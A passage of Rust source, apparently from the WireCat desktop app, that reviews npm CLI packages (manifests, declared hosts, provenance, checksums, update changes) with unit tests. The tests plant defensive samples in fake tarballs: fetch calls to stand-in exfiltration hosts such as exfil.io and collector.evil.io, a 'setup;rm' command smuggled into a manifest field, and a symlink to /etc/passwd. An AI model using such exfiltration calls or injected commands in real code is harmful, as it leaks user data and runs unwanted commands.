    let mut signals = own_risks::npm(view, &code.bundled, publishers.len(), built, chrono::Utc::now());
    signals.extend(own_risks::network(code, hosts, &known));
    signals
}

/// Text from the manifest shown as a line: no line breaks, at most `max` characters.
fn line(text: &str, max: usize) -> String {
    text.split_whitespace().collect::<Vec<_>>().join(" ").chars().take(max).collect()
}

fn command_of(c: &ManifestCommand) -> Command {
    let e = c.effects.unwrap_or(Effects { remote: Level::Write, local: Level::Write });
    let text = |t: &Option<String>| t.as_deref().map(|t| line(t, 300)).filter(|t| !t.is_empty());
    Command {
        words: c.path.join(" "),
        remote: e.remote,
        local: e.local,
        summary: text(&c.summary),
        entity: text(&c.entity),
    }
}

/// Entity and field names are cli-base's snake case; anything else is left out rather than shown.
fn entities_of(m: &Manifest) -> std::collections::BTreeMap<String, Vec<String>> {
    let name = |n: &str| n.len() <= 64 && n.bytes().all(|b| b.is_ascii_lowercase() || b.is_ascii_digit() || b == b'_');
    m.entities
        .iter()
        .filter(|(e, _)| name(e))
        .take(64)
        .map(|(e, v)| (e.clone(), v.fields.iter().filter(|f| name(f)).take(64).cloned().collect()))
        .collect()
}

/// cli-base's `HOST_PATTERN` (`src/http/hosts.ts`): lower-case labels, and `*.` only before two or more of them, so
/// `*.com` cannot declare a whole top-level domain.
fn plain_host(h: &str) -> bool {
    let label = |l: &str| {
        (1..=63).contains(&l.len())
            && l.bytes().all(|b| b.is_ascii_lowercase() || b.is_ascii_digit() || b == b'-')
            && !l.starts_with('-')
            && !l.ends_with('-')
    };
    let (name, min_labels) = h.strip_prefix("*.").map_or((h, 1), |rest| (rest, 2));
    h.len() <= 253 && name.split('.').count() >= min_labels && name.split('.').all(label)
}

fn declared_hosts(m: &Manifest) -> Result<Option<Vec<String>>, Refusal> {
    let Some(network) = &m.network else { return Ok(None) };
    if let Some(wrong) = network.hosts.iter().find(|h| !plain_host(h)) {
        return Err(bad(
            "network.hosts",
            format!("{wrong:?} is not a host name such as api.example.com or *.example.com."),
        ));
    }
    Ok(Some(network.hosts.clone()))
}

fn host_of(url: &str) -> Option<String> {
    let rest = url.strip_prefix("https://").or_else(|| url.strip_prefix("http://"))?;
    let host = rest.split(['/', ':', '?', '#']).next()?.to_ascii_lowercase();
    (!host.is_empty()).then_some(host)
}

/// npm user names are lower-case letters, digits, `.`, `_` and `-`; anything else gets no profile link.
fn npm_user(name: &str) -> bool {
    !name.is_empty() && name.bytes().all(|b| b.is_ascii_lowercase() || b.is_ascii_digit() || b"._-".contains(&b))
}

fn links_of(
    package: &str,
    version: &str,
    publishers: &[String],
    built: Option<&BuiltBy>,
    release: &provenance::Release,
) -> Links {
    let commit = built.zip(release.commit.as_deref()).map(|(b, c)| format!("{}/commit/{c}", b.repo));
    // The run belongs to the repository that built the release, or it is not this release's run.
    let run = built
        .zip(release.run.as_deref())
        .filter(|(b, run)| run.starts_with(&format!("{}/actions/runs/", b.repo)))
        .map(|(_, run)| run.to_string());
    Links {
        npm: format!("https://www.npmjs.com/package/{package}/v/{version}"),
        publishers: publishers
            .iter()
            .filter(|p| npm_user(p))
            .map(|p| Link { label: p.clone(), url: format!("https://www.npmjs.com/~{p}") })
            .collect(),
        commit,
        run,
        log: release.log_index.map(|i| format!("https://search.sigstore.dev/?logIndex={i}")),
    }
}

/// GitHub's facts about the repository the review showed, at the release commit; a separate call so the review shows
/// without waiting for GitHub. The token must still name an open review.
pub fn risks(token: &str) -> Result<Vec<Signal>, String> {
    let (repo, commit) = REVIEWS
        .lock()
        .unwrap()
        .get(token)
        .map(|r| (r.review.repo.clone(), r.review.commit.clone()))
        .ok_or_else(|| GONE.to_string())?;
    Ok(match repo {
        Some(repo) => own_risks::github(&repo, commit.as_deref()),
        None => vec![Signal::NoRepository],
    })
}

pub fn access_of(commands: &[ManifestCommand]) -> Access {
    let mut access = Access::default();
    for c in commands {
        let words = c.path.join(" ");
        let e = c.effects.unwrap_or(Effects { remote: Level::Write, local: Level::Write });
        match e.remote {
            Level::Write => access.changes.push(words.clone()),
            Level::Read => access.reads.push(words.clone()),
            Level::None => {}
        }
        if e.local == Level::Write {
            access.writes.push(words);
        }
    }
    access
}

fn previous_entry(saved: &str, package: &str) -> Option<Value> {
    community::file_entries(saved).ok()?.into_iter().find(|e| e["package"] == package)
}

/// What a new version of an own tool says, against the entry saved when the owner last confirmed it.
struct Now<'a> {
    repo: Option<&'a str>,
    built: Option<&'a BuiltBy>,
    publishers: &'a [String],
    commands: &'a [String],
    access: &'a Access,
}

fn joined(list: &Value) -> Vec<String> {
    let words = |c: &Value| c.as_array().map(|w| w.iter().filter_map(Value::as_str).collect::<Vec<_>>().join(" "));
    list.as_array().into_iter().flatten().filter_map(words).collect()
}

fn change_of(old: &Value, entry: &Value, now: Now) -> UpdateChange {
    let own = &old["own"];
    let before_writes = [joined(&own["changes"]), joined(&own["writes"])].concat();
    let mut new_writes: Vec<String> =
        now.access.changes.iter().chain(&now.access.writes).filter(|w| !before_writes.contains(w)).cloned().collect();
    new_writes.sort();
    new_writes.dedup();
    let before_commands = joined(&own["commands"]);
    let new_commands: Vec<String> = now.commands.iter().filter(|c| !before_commands.contains(c)).cloned().collect();
    let new_parts: Vec<String> = ["signIn", "mcpServer", "skill", "sync"]
        .into_iter()
        .filter(|k| old[*k].is_null() && !entry[*k].is_null())
        .map(str::to_string)
        .collect();
    let changed_parts: Vec<String> =
        ["signIn", "doctor", "setup", "sync", "mcpServer", "skill", "runs", "profiles", "storage"]
            .into_iter()
            .filter(|k| !old[*k].is_null() && old[*k] != entry[*k])
            .map(str::to_string)
            .collect();
    let from_repo = old["repo"].as_str().map(str::to_string);
    let repo_changed = !from_repo.as_deref().unwrap_or_default().eq_ignore_ascii_case(now.repo.unwrap_or_default());
    let from_built = serde_json::from_value::<Option<BuiltBy>>(own["built"].clone()).unwrap_or(None);
    let provenance_changed = from_built.as_ref() != now.built;
    let from_publishers: Vec<String> = own["publishers"]
        .as_str()
        .unwrap_or_default()
        .split(", ")
        .filter(|p| !p.is_empty())
        .map(str::to_string)
        .collect();
    let sorted = |list: &[String]| {
        let mut l = list.to_vec();
        l.sort();
        l
    };
    let publishers_changed = sorted(&from_publishers) != sorted(now.publishers);
    // Without a manifest the access is unknown, and unknown is not the same as unchanged.
    let confirm = repo_changed
        || provenance_changed
        || publishers_changed
        || !new_commands.is_empty()
        || !new_writes.is_empty()
        || !new_parts.is_empty()
        || !changed_parts.is_empty()
        || now.access.unknown;
    UpdateChange {
        from_version: own["version"].as_str().unwrap_or_default().into(),
        repo_changed,
        from_repo,
        provenance_changed,
        from_built,
        publishers_changed,
        from_publishers,
        new_commands,
        new_writes,
        new_parts,
        changed_parts,
        confirm,
    }
}

/// Names only: npm lists `name <email>`, and the review has no use for the address.
fn publishers(maintainers: &Value) -> Vec<String> {
    let names = maintainers.as_array().into_iter().flatten().filter_map(|m| {
        let name = m.as_str().map(|s| s.split(" <").next().unwrap_or(s)).or_else(|| m["name"].as_str())?;
        Some(name.trim().to_string()).filter(|n| !n.is_empty())
    });
    names.collect()
}

/// Installs the reviewed version, checks that the installed program names the manifest that was shown, and saves the
/// entry; the tool appears at the next start.
pub fn add(token: &str, reviewed: Arc<Reviewed>, running: &Running, events: &Channel<InstallEvent>) {
    let entry = with_preexisting(&reviewed.entry, &reviewed.tool);
    let pin = install::Pin { version: &reviewed.version, integrity: &reviewed.integrity };
    let done = install::install_reviewed(&reviewed.tool, &pin, running, events, &|| {
        if let Some(sha) = &reviewed.manifest_sha256 {
            let program = tools::program(&reviewed.tool.bin)
                .ok_or_else(|| format!("`{}` is not on your PATH after the install.", reviewed.tool.bin))?;
            let path = paths::search_path();
            let out = run::run_capped(&program, &["--wcat-describe"], Some(&path), DESCRIBE_TIMEOUT, MAX_DESCRIBE)
                .map_err(|e| format!("`{} --wcat-describe` did not answer: {e}", reviewed.tool.bin))?;
            describe_matches(&out.stdout, sha)?;
        }
        save(&tools_file()?, &entry)?;
        crate::catalog::reload();
        Ok(())
    });
    if !done {
        ADDED.lock().unwrap().insert(token.to_string(), reviewed);
    }
}

/// Recorded before the install, so a folder the install or its first run creates is the tool's own. The first add
/// records it; an update's entry already carries it.
fn with_preexisting(entry: &Value, tool: &Tool) -> Value {
    let mut entry = entry.clone();
    if entry["own"]["preexisting"].is_object() {
        return entry;
    }
    let found: serde_json::Map<String, Value> = crate::storage::defaults(&tool.storage)
        .into_iter()
        .filter(|(_, p)| p.is_dir())
        .map(|(_, p)| (p.to_string_lossy().into_owned(), Value::Bool(true)))
        .collect();
    entry["own"]["preexisting"] = Value::Object(found);
    entry
}

pub fn uninstall(reviewed: &Reviewed, running: &Running, events: &Channel<InstallEvent>) {
    install::uninstall(&reviewed.tool, running, events);
}

/// The installed program must name the manifest the owner reviewed. This catches a package whose installed files
/// differ from the tarball that was read, such as a manifest npm extracted from somewhere else; it proves nothing
/// against a hostile package, whose program can print any hash it likes.
fn describe_matches(stdout: &str, sha: &str) -> Result<(), String> {
    const REFUSED: &str =
        "The installed tool describes itself differently from the package WireCat showed you, so it was not added.";
    if stdout.len() > MAX_DESCRIBE {
        return Err(REFUSED.into());
    }
    let v: Value = serde_json::from_str(stdout).map_err(|_| REFUSED.to_string())?;
    match v["manifest_sha256"].as_str() {
        Some(got) if got.eq_ignore_ascii_case(sha) => Ok(()),
        _ => Err(REFUSED.into()),
    }
}

/// An add and a remove read, change and write the same file; one at a time, or one would undo the other.
static FILE_LOCK: Mutex<()> = Mutex::new(());

/// Replaces the entry with the same package, or adds it; written beside the file and renamed, so a crash never leaves
/// half a file.
pub fn save(file: &Path, entry: &Value) -> Result<(), String> {
    let _one = FILE_LOCK.lock().unwrap_or_else(std::sync::PoisonError::into_inner);
    let mut entries = read_entries(file)?;
    entries.retain(|e| e["package"] != entry["package"]);
    entries.push(entry.clone());
    write_entries(file, entries)
}

/// Deletes the entry; the program stays installed until the owner uninstalls it.
pub fn remove(file: &Path, id: &str) -> Result<(), String> {
    let _one = FILE_LOCK.lock().unwrap_or_else(std::sync::PoisonError::into_inner);
    let mut entries = read_entries(file)?;
    let before = entries.len();
    entries.retain(|e| e["id"] != id);
    if entries.len() == before {
        return Err(format!("{id} is not one of your own tools."));
    }
    write_entries(file, entries)
}

pub fn remove_saved(id: &str) -> Result<(), String> {
    remove(&tools_file()?, id)?;
    crate::catalog::reload();
    Ok(())
}

fn read_entries(file: &Path) -> Result<Vec<Value>, String> {
    match std::fs::read_to_string(file) {
        Ok(text) => community::file_entries(&text).map_err(|why| format!("{why} Fix or move the file first.")),
        Err(e) if e.kind() == std::io::ErrorKind::NotFound => Ok(Vec::new()),
        Err(e) => Err(format!("Could not read {}: {e}", community::FILE)),
    }
}

fn write_entries(file: &Path, entries: Vec<Value>) -> Result<(), String> {
    let text = serde_json::to_string_pretty(&json!({ "version": 1, "tools": entries })).unwrap_or_default();
    if let Some(dir) = file.parent() {
        std::fs::create_dir_all(dir).map_err(|e| format!("Could not save your own tools: {e}"))?;
    }
    let partial = file.with_extension("json.partial");
    std::fs::write(&partial, text)
        .and_then(|()| std::fs::rename(&partial, file))
        .map_err(|e| format!("Could not save your own tools: {e}"))
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::catalog::catalog;
    use std::cell::RefCell;

    fn manifest() -> Value {
        json!({
            "wcat_manifest": 2,
            "name": "acme-crm",
            "description": "Contacts and deals from Acme CRM.",
            "docs_url": "https://example.com/acme-crm",
            "package": "@example/acme-crm-cli",
            "bin": "wcat-acme-crm",
            "commands": [
                { "path": ["contacts", "list"], "effects": { "remote": "read", "local": "write" }, "permission": "contacts" },
                { "path": ["deals", "update"], "effects": { "remote": "write", "local": "none" } },
                { "path": ["sync"] }
            ],
            "desktop": {
                "tagline": "Acme CRM contacts and deals",
                "profiles": { "args": ["profile", "list", "--json", "--no-record"], "shape": "items" },
                "doctor": ["{profile}", "doctor", "--json", "--record"],
                "setup": ["{profile}", "setup"],
                "signIn": { "gives": "your contacts and deals", "asks": "an API token" },
                "sync": null,
                "storage": { "app": "example-acme-crm-cli", "env": "ACME_CRM" }
            }
        })
    }

    fn tgz(files: &[(&str, &[u8])]) -> Vec<u8> {
        let mut builder = tar::Builder::new(flate2::write::GzEncoder::new(Vec::new(), flate2::Compression::fast()));
        for (path, bytes) in files {
            let mut header = tar::Header::new_gnu();
            header.set_size(bytes.len() as u64);
            header.set_mode(0o644);
            header.set_cksum();
            builder.append_data(&mut header, path, *bytes).unwrap();
        }
        builder.into_inner().unwrap().finish().unwrap()
    }

    fn integrity(bytes: &[u8]) -> String {
        format!("sha512-{}", STANDARD.encode(Sha512::digest(bytes)))
    }

    struct Fake {
        view: Result<Value, Refusal>,
        tarball: Vec<u8>,
        asked: RefCell<Vec<String>>,
    }

    impl Fake {
        fn with(manifest: &Value) -> Self {
            Self::of(tgz(&[
                ("package/package.json", b"{}"),
                ("package/contracts/wirecat.json", manifest.to_string().as_bytes()),
            ]))
        }

        fn of(tarball: Vec<u8>) -> Self {
            let view = json!({
                "name": "@example/acme-crm-cli",
                "version": "0.3.0",
                "repository": { "type": "git", "url": "git+https://github.com/example/acme-crm-cli.git" },
                "maintainers": ["example <dev@example.com>"],
                "bin": { "wcat-acme-crm": "dist/bin.js" },
                "dist": { "integrity": integrity(&tarball), "tarball": "https://registry.npmjs.org/x.tgz" }
            });
            Fake { view: Ok(view), tarball, asked: RefCell::new(Vec::new()) }
        }
    }

    impl Registry for Fake {
        fn view(&self, package: &str) -> Result<Value, Refusal> {
            self.asked.borrow_mut().push(package.into());
            self.view.clone()
        }
        fn attestations(&self, _: &str, _: &str) -> Result<Value, Refusal> {
            Ok(json!({ "attestations": [] }))
        }
        fn download(&self, _: &str) -> Result<Vec<u8>, Refusal> {
            Ok(self.tarball.clone())
        }
    }

    fn refused(fake: &Fake) -> Refusal {
        review("@example/acme-crm-cli", None, fake, catalog(), "").err().expect("refused")
    }

    fn with_desktop(key: &str, value: Value) -> Value {
        let mut m = manifest();
        m["desktop"][key] = value;
        m
    }

    #[test]
    fn a_described_package_is_reviewed_with_its_access_grouped() {
        let raw = manifest().to_string();
        let r = review("@example/acme-crm-cli", None, &Fake::with(&manifest()), catalog(), "").unwrap();
        assert_eq!((r.review.id.as_str(), r.review.version.as_str()), ("acmecrm", "0.3.0"));
        assert_eq!(r.review.repo.as_deref(), Some("https://github.com/example/acme-crm-cli"));
        assert_eq!(r.review.publishers, ["example"]);
        assert_eq!(r.review.built, None, "no provenance is shown as none, not refused");
        assert_eq!(r.review.access.reads, ["contacts list"]);
        assert_eq!(r.review.access.changes, ["deals update", "sync"], "undeclared effects count as writes");
        assert_eq!(r.review.access.writes, ["contacts list", "sync"]);
        assert_eq!(r.manifest_sha256.as_deref(), Some(hex(&Sha256::digest(raw.as_bytes())).as_str()));
        assert_eq!(r.tool.source, Source::Own);
        assert!(r.entry["runs"].is_null() && r.entry["community"] == true);
    }

    #[test]
    fn the_review_links_each_fact_lists_every_command_and_flags_what_to_check() {
        let r = review("@example/acme-crm-cli", None, &Fake::with(&manifest()), catalog(), "").unwrap().review;
        assert_eq!(r.links.npm, "https://www.npmjs.com/package/@example/acme-crm-cli/v/0.3.0");
        assert_eq!(
            r.links.publishers,
            [Link { label: "example".into(), url: "https://www.npmjs.com/~example".into() }]
        );
        assert!(r.links.commit.is_none() && r.links.run.is_none() && r.links.log.is_none(), "no provenance");
        assert_eq!(
            r.commands[1],
            Command {
                words: "deals update".into(),
                remote: Level::Write,
                local: Level::None,
                summary: None,
                entity: None
            }
        );
        assert_eq!((r.commands[2].remote, r.commands[2].local), (Level::Write, Level::Write), "undeclared: writes");
        assert_eq!(r.tarball, "https://registry.npmjs.org/x.tgz");
        assert!(r.integrity.starts_with("sha512-") && !r.uses_core && r.hosts.is_none());
        assert!(r.signals.contains(&Signal::NoProvenance) && r.signals.contains(&Signal::NoHosts));
        assert!(r.signals.contains(&Signal::OnePublisher));
    }

    #[test]
    fn declared_hosts_entities_and_summaries_are_read_and_other_hosts_in_the_code_are_flagged() {
        let code = b"import { request } from \"node:https\"; const u = \"https://api.acme.io/v1\"; \
            const x = \"https://collector.evil.io/\";";
        let mut m = manifest();
        m["network"] = json!({ "hosts": ["api.acme.io"] });
        let fake = |m: &Value| {
            Fake::of(tgz(&[
                ("package/dist/bin.js", code),
                ("package/contracts/wirecat.json", m.to_string().as_bytes()),
            ]))
        };
        let r = review("@example/acme-crm-cli", None, &fake(&m), catalog(), "").unwrap().review;
        assert_eq!(r.hosts.as_deref(), Some(&["api.acme.io".to_string()][..]));
        assert!(r.signals.contains(&Signal::NetworkCode { modules: vec!["https".into()] }));
        assert!(r.signals.contains(&Signal::UndeclaredHosts { hosts: vec!["collector.evil.io".into()], more: 0 }));
        assert!(!r.signals.contains(&Signal::NoHosts));

        let mut chosen = manifest();
        chosen["network"] = json!({ "hosts": [], "user_hosts": "the mail server you sign in to" });
        chosen["commands"][0]["summary"] = json!("list contacts");
        chosen["commands"][0]["entity"] = json!("contact");
        chosen["entities"] = json!({ "contact": { "fields": ["name", "email", "phone"] } });
        let r = review("@example/acme-crm-cli", None, &fake(&chosen), catalog(), "").unwrap().review;
        assert_eq!(r.hosts.as_deref(), Some(&[][..]), "hosts: [] says it contacts none");
        assert_eq!(r.user_hosts.as_deref(), Some("the mail server you sign in to"));
        assert_eq!(r.entities["contact"], ["name", "email", "phone"]);
        assert_eq!(
            (r.commands[0].summary.as_deref(), r.commands[0].entity.as_deref()),
            (Some("list contacts"), Some("contact"))
        );
        assert!(r.signals.contains(&Signal::UndeclaredHosts {
            hosts: vec!["api.acme.io".into(), "collector.evil.io".into()],
            more: 0
        }));

        let mut cli_base = manifest();
        cli_base["network"] = json!({ "hosts": ["api.acme.example", "*.cdn.acme.example"],
            "user_hosts": "the mail server you sign in to" });
        let r = review("@example/acme-crm-cli", None, &fake(&cli_base), catalog(), "").unwrap().review;
        assert_eq!(r.hosts.unwrap(), ["api.acme.example", "*.cdn.acme.example"], "cli-base#529's own example passes");

        for wrong in ["https://api.acme.io/v1", "*.com", "*.io", "API.acme.io", "api_x.acme.io"] {
            let mut m = manifest();
            m["network"] = json!({ "hosts": [wrong] });
            assert!(
                matches!(refused(&fake(&m)), Refusal::BadManifest { key, .. } if key == "network.hosts"),
                "{wrong}"
            );
        }
        let mut many = manifest();
        many["network"] = json!({ "hosts": (0..80).map(|i| format!("h{i}.acme.io")).collect::<Vec<_>>() });
        assert_eq!(
            review("@example/acme-crm-cli", None, &fake(&many), catalog(), "").unwrap().review.hosts.unwrap().len(),
            80
        );
    }

    #[test]
    fn a_homepage_or_docs_host_is_a_server_unless_declared_and_twenty_declared_hosts_cannot_hide_one() {
        let code = b"fetch(\"https://exfil.io/up\"); fetch(\"https://github.com/example/acme-crm-cli\")";
        let fake = || {
            Fake::of(tgz(&[
                ("package/dist/bin.js", code),
                ("package/contracts/wirecat.json", manifest().to_string().as_bytes()),
            ]))
        };
        let mut f = fake();
        let mut view = f.view.clone().unwrap();
        view["homepage"] = json!("https://exfil.io");
        f.view = Ok(view);
        let r = review("@example/acme-crm-cli", None, &f, catalog(), "").unwrap().review;
        assert!(
            r.signals.contains(&Signal::UndeclaredHosts { hosts: vec!["exfil.io".into()], more: 0 }),
            "{:?}",
            r.signals
        );

        let mut text: String = (0..20).map(|i| format!("\"https://h{i}.acme.io\"; ")).collect::<Vec<_>>().concat();
        text.push_str("\"https://collector.evil.io\"");
        let mut m = manifest();
        m["network"] = json!({ "hosts": ["*.acme.io"] });
        let f = Fake::of(tgz(&[
            ("package/dist/bin.js", text.as_bytes()),
            ("package/contracts/wirecat.json", m.to_string().as_bytes()),
        ]));
        let r = review("@example/acme-crm-cli", None, &f, catalog(), "").unwrap().review;
        assert!(r.signals.contains(&Signal::UndeclaredHosts { hosts: vec!["collector.evil.io".into()], more: 0 }));
    }

    #[test]
    fn a_comment_does_not_hide_a_call_and_extensionless_programs_and_native_files_are_read() {
        let m = manifest().to_string();
        let f = Fake::of(tgz(&[
            ("package/dist/a.js", br#"/*! MIT */ fetch("https://evil.io/x")"#),
            ("package/bin/acme", b"import net from \"node:net\""),
            ("package/run", b"#!/usr/bin/env node\nnew WebSocket(\"wss://ws.evil.io\")"),
            ("package/build/addon.node", b"\x7fELF"),
            ("package/contracts/wirecat.json", m.as_bytes()),
        ]));
        let mut f = f;
        let mut view = f.view.clone().unwrap();
        view["bin"] = json!({ "wcat-acme-crm": "./bin/acme" });
        f.view = Ok(view);
        let r = review("@example/acme-crm-cli", None, &f, catalog(), "").unwrap().review;
        assert!(
            r.signals
                .contains(&Signal::NetworkCode { modules: vec!["net".into(), "fetch".into(), "WebSocket".into()] }),
            "{:?}",
            r.signals
        );
        assert!(
            r.signals
                .contains(&Signal::UndeclaredHosts { hosts: vec!["evil.io".into(), "ws.evil.io".into()], more: 0 })
        );
        assert!(r.signals.contains(&Signal::NativeCode { files: vec!["build/addon.node".into()] }));
    }

    #[test]
    fn a_bundled_cli_core_counts_as_cli_core() {
        let code = b"// node_modules/.pnpm/@wirecat+cli-core@0.605.0_x/node_modules/@wirecat/cli-core/dist/a.js\nx\n";
        let f = Fake::of(tgz(&[
            ("package/dist/bundle.js", code),
            ("package/contracts/wirecat.json", manifest().to_string().as_bytes()),
        ]));
        let r = review("@example/acme-crm-cli", None, &f, catalog(), "").unwrap().review;
        assert!(r.uses_core);
        assert!(
            !r.signals.iter().any(|s| matches!(s, Signal::CoreOutOfRange { .. } | Signal::BundledUnknown { .. })),
            "{:?}",
            r.signals
        );
    }

    #[test]
    fn a_package_file_outside_npms_public_registry_is_refused() {
        let mut fake = Fake::with(&manifest());
        let mut view = fake.view.clone().unwrap();
        view["dist"]["tarball"] = json!("https://evil.example.net/acme.tgz");
        fake.view = Ok(view);
        assert!(matches!(refused(&fake), Refusal::BadManifest { key, .. } if key == "dist.tarball"));
    }

    #[test]
    fn a_reload_keeps_the_built_in_tools_and_every_tool_handed_out_before_it() {
        let tg = crate::catalog::tool("tg").unwrap();
        crate::catalog::reload();
        assert_eq!(tg.id, "tg", "a tool handed out before the reload is still readable");
        assert!(crate::catalog::tool("tg").is_ok());
    }

    #[test]
    fn a_bad_name_is_refused_before_npm_is_asked() {
        let fake = Fake::with(&manifest());
        for (name, kind) in [("acme-crm", Refusal::NotScoped), ("@wirecat/acme", Refusal::WirecatScope)] {
            assert_eq!(review(name, None, &fake, catalog(), "").err(), Some(kind));
        }
        assert_eq!(*fake.asked.borrow(), Vec::<String>::new());
    }

    #[test]
    fn npm_errors_become_not_found_or_offline() {
        let e404 = r#"{"error":{"code":"E404","summary":"Not Found"}}"#;
        assert_eq!(view_answer(Some(1), e404).err(), Some(Refusal::NotFound));
        let offline = r#"{"error":{"code":"ENOTFOUND","summary":"getaddrinfo ENOTFOUND registry.npmjs.org"}}"#;
        assert!(matches!(view_answer(Some(1), offline), Err(Refusal::Offline { .. })));
        let mut fake = Fake::with(&manifest());
        fake.view = Err(Refusal::Offline { detail: "no network".into() });
        assert!(matches!(refused(&fake), Refusal::Offline { .. }));
    }

    #[test]
    fn the_tarball_must_match_npms_checksum() {
        let mut fake = Fake::with(&manifest());
        fake.tarball[20] ^= 1;
        assert!(matches!(refused(&fake), Refusal::BadManifest { key, .. } if key == "dist.integrity"));
    }

    #[test]
    fn the_manifest_is_read_from_the_tarball_in_memory() {
        let raw = b"{\"wcat_manifest\":2}";
        let found = manifest_in(&tgz(&[("package/contracts/wirecat.json", raw)])).unwrap();
        assert_eq!(found.as_deref(), Some(&raw[..]));
        assert_eq!(manifest_in(&tgz(&[("package/wirecat.json", raw)])).unwrap(), None);
        let big = vec![b' '; usize::try_from(MAX_MANIFEST).unwrap() + 1];
        assert!(matches!(
            manifest_in(&tgz(&[("package/contracts/wirecat.json", &big)])),
            Err(Refusal::TooLarge { .. })
        ));
        assert!(matches!(manifest_in(b"not a tarball"), Err(Refusal::BadManifest { .. })));
    }

    #[test]
    fn a_package_without_a_manifest_asks_for_the_desktop_object() {
        let fake = Fake::of(tgz(&[("package/package.json", b"{}")]));
        assert_eq!(refused(&fake), Refusal::NoManifest);
        let mut desktop = manifest()["desktop"].clone();
        desktop["name"] = json!("acme-crm");
        let pasted = desktop.to_string();
        let r = review("@example/acme-crm-cli", Some(&pasted), &fake, catalog(), "").unwrap();
        assert!(!r.review.described && r.review.access.unknown && r.manifest_sha256.is_none());
        assert_eq!(r.tool.bin, "wcat-acme-crm", "the one program npm installs");
        assert!(matches!(
            review("@example/acme-crm-cli", Some("{"), &fake, catalog(), ""),
            Err(Refusal::BadManifest { .. })
        ));
    }

    #[test]
    fn every_community_rule_applies_to_the_manifest() {
        let shell = with_desktop("setup", json!(["setup;rm"]));
        assert!(matches!(refused(&Fake::with(&shell)), Refusal::BadManifest { key, .. } if key == "setup"));
        let ours = with_desktop("storeReset", json!(["store", "reset"]));
        assert!(matches!(refused(&Fake::with(&ours)), Refusal::BadManifest { key, .. } if key == "storeReset"));
        let unknown = with_desktop("hooks", json!({}));
        assert!(matches!(refused(&Fake::with(&unknown)), Refusal::BadManifest { key, .. } if key == "hooks"));
        let mut other = manifest();
        other["version"] = json!("0.2.0");
        assert!(matches!(refused(&Fake::with(&other)), Refusal::BadManifest { key, .. } if key == "version"));
        let mut format1 = manifest();
        format1["wcat_manifest"] = json!(1);
        assert!(matches!(refused(&Fake::with(&format1)), Refusal::BadManifest { key, .. } if key == "wcat_manifest"));
    }

    #[test]
    fn a_name_of_an_official_or_listed_tool_is_a_collision_that_names_it() {
        let tg = catalog().tools.iter().find(|t| t.id == "tg").unwrap();
        let taken = with_desktop("storage", json!({ "app": tg.storage.app, "env": "ACME_CRM" }));
        assert_eq!(refused(&Fake::with(&taken)), Refusal::Collision { with: "Telegram".into(), listed: false });

        let listed: Catalog = serde_json::from_value(json!({
            "tools": [],
            "sharedStorage": { "app": "WireCat", "env": "WIRECAT" }
        }))
        .unwrap();
        let mut listed = listed;
        let mut acme: Tool = serde_json::from_value(
            entry_of(
                &parse_manifest(manifest().to_string().as_bytes(), "@example/acme-crm-cli", "0.3.0").unwrap(),
                &json!({}),
                Some("https://github.com/example/acme-crm-cli"),
            )
            .unwrap(),
        )
        .unwrap();
        acme.name = "Acme Listed".into();
        acme.source = Source::Community;
        listed.tools.push(acme);
        let r = review("@example/acme-crm-cli", None, &Fake::with(&manifest()), &listed, "");
        assert_eq!(r.err(), Some(Refusal::Collision { with: "Acme Listed".into(), listed: true }));
    }

    #[test]
    fn provenance_from_another_repository_is_refused() {
        let mut fake = Fake::with(&manifest());
        let mut view = fake.view.clone().unwrap();
        view["repository"] = json!("https://github.com/WireCatLabs/acme");
        fake.view = Ok(view);
        assert_eq!(refused(&fake), Refusal::WirecatScope);
        assert_eq!(
            github_repo(&json!("git@github.com:example/acme.git")).unwrap().as_deref(),
            Some("https://github.com/example/acme")
        );
        assert_eq!(github_repo(&json!({ "url": "https://gitlab.com/example/acme" })).unwrap(), None);
    }

    #[test]
    fn an_update_needs_a_new_confirmation_for_a_new_repository_or_new_writes() {
        let first = review("@example/acme-crm-cli", None, &Fake::with(&manifest()), catalog(), "").unwrap();
        let saved = json!({ "version": 1, "tools": [first.entry] }).to_string();
        let same = review("@example/acme-crm-cli", None, &Fake::with(&manifest()), catalog(), &saved).unwrap();
        let change = same.review.update.unwrap();
        assert!(!change.confirm, "{change:?}");

        let mut more = manifest();
        more["commands"]
            .as_array_mut()
            .unwrap()
            .push(json!({ "path": ["contacts", "delete"], "effects": { "remote": "write", "local": "none" } }));
        let wider = review("@example/acme-crm-cli", None, &Fake::with(&more), catalog(), &saved).unwrap();
        let change = wider.review.update.unwrap();
        assert_eq!(change.new_writes, ["contacts delete"]);
        assert!(change.confirm);
    }

    #[test]
    fn an_mcp_server_gets_a_port_no_other_tool_uses_and_keeps_it_on_update() {
        let words = json!(["mcp", "server", "start", "--port", "{port}", "--json"]);
        let with_server = with_desktop(
            "mcpServer",
            json!({ "start": words, "stop": ["mcp", "server", "stop"], "status": ["mcp", "server", "status"],
                "revoke": ["mcp", "revoke"], "config": null }),
        );
        let first = review("@example/acme-crm-cli", None, &Fake::with(&with_server), catalog(), "").unwrap();
        assert_eq!(first.entry["mcpServer"]["port"], FIRST_PORT, "8765-8769 are the catalog's");
        let mut other = first.entry.clone();
        other["id"] = json!("other");
        other["bin"] = json!("wcat-other");
        other["package"] = json!("@example/other");
        other["storage"] = json!({ "app": "example-other", "env": "OTHER" });
        other["own"]["name"] = json!("other");
        let saved = json!({ "version": 1, "tools": [other] }).to_string();
        let second = review("@example/acme-crm-cli", None, &Fake::with(&with_server), catalog(), &saved);
        assert_eq!(second.unwrap().entry["mcpServer"]["port"], FIRST_PORT + 1);
        let mut kept = first.entry.clone();
        kept["mcpServer"]["port"] = json!(8900);
        let saved = json!({ "version": 1, "tools": [kept] }).to_string();
        let update = review("@example/acme-crm-cli", None, &Fake::with(&with_server), catalog(), &saved);
        assert_eq!(update.unwrap().entry["mcpServer"]["port"], 8900);
    }

    #[test]
    fn a_second_or_linked_manifest_in_the_tarball_is_refused() {
        let raw = manifest().to_string();
        let twice =
            tgz(&[("package/contracts/wirecat.json", raw.as_bytes()), ("package/contracts/wirecat.json", b"{}")]);
        assert!(
            matches!(manifest_in(&twice), Err(Refusal::BadManifest { rule, .. }) if rule.contains("more than once"))
        );

        let mut builder = tar::Builder::new(flate2::write::GzEncoder::new(Vec::new(), flate2::Compression::fast()));
        let mut header = tar::Header::new_gnu();
        header.set_entry_type(tar::EntryType::Symlink);
        header.set_size(0);
        builder.append_link(&mut header, "package/contracts/wirecat.json", "/etc/passwd").unwrap();
        let linked = builder.into_inner().unwrap().finish().unwrap();
